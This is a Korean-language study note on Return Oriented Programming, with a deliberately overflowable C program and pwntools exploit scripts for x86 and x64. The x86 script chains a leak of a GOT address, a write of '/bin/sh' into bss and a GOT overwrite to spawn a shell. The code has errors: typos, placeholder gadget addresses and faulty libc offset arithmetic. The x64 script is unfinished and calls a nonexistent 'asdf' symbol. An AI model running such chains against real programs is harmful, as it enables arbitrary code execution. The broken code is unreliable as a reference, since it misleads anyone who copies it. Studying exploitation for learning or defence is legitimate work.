# ROP(Retrun Oriented programing)

# x86

### 알아야 할 것

매개변수가 콜스택으로 넘겨짐

```c
#include<stdio.h>
int main(){
	int buf[0x100];
	read(0 buf, 0x200);
	write(1, buf, 0x200);
	return 0;
}
```

![Untitled](ROP(Retrun%20Oriented%20programing)%200f1c1063c7454e8e9b291bc6d5a5572e/Untitled.png)

32bit에서 원하는 매개변수를 가지고 원하는 함수를 호출하기 위해서는

pop을 하고 ret하는 가젯을 찾아야 한다.

파일 안에 symbols이 살아 있는 read 함수를 호출하고 싶다면 인자 매개변수가 3개이므로 pop를 3번하고 ret하는 가젯을 찾아야 하는 것이다.

### 공격 시나리오

1. write 함수로 read나 write함수의 주소를 출력한다.(system함수 주소를 얻기 위함) → main 새로 시작
2. read 함수로 쓰기권한이 있는 영역에 "/bin/sh" 문자열을 쓴다. ex) bss
3. read함수로 read나 write함수의 got에 system함수를 저장한다.
4. system함수로 /bin/sh를 실행한다.

### Exploit

```python
from pwn import *

p = process('./a.out')
e = ELF('./a.out')

pppr = 0x12345678 # pop; pop; pop; ret;
pr = 0x87654321 # pop; ret;

# Stage 1
payload = 'A'*0x100
payload += "AAAA"
payload += p32(e.plt['write'])
payload += p32(pppr)
payload += p32(1)
payload += p32(e.got['write'])
payload += p32(4)
payload += p32(e.symbols['main'])
p.send(payload)
leak = u32(p.recv()[-4:])

# Stage 2
payload = 'A'*0x100
payload += "AAAA"
payload += p32(e.plt['read'])
payload += p32(pppr)
payload += p32(0)
payload += p32(e.bss())
payload += p32(4)

# Stage 3
payload += p32(e.plt['read'])
payload += p32(pppr)
payload += p32(0)
payload += p32(e.got['write'])
payload += p32(4)

# Stage 4
payload += p32(e.plt['write'])
paylaod += p32(pr)
payload += p32(e.bss())

# Send
p.send(payload)
p.send('/bin/sh\x00')
p.send(p32(leak - e.symbols['read']))

p.interactive()
```

# x64

### 알야하 할것

64bit에서는 매개변수로 레지스터를 사용함

ex) rdi rsi rdx rcx

```c
#include<stdio.h>
int main(){
	int buf[0x100];
	read(0 buf, 0x200);
	write(1, buf, 0x200);
	return 0;
}
```

### 공격 시나리오

동일함

### Exploit

```python
from pwn import *

p = process('./a.out')
e = ELF('./a.out')

prdi # pop rdi; ret;
prsi # pop rsi; ret;
prdx # pop rdx; ret;

payload = 'A'*0x108
payload += p64(prdi)
payload += p64(1)
payload += p64(prsi)
payload += p64(2)
payload += p64(e.plt['asdf'])
payload += p64(8)
```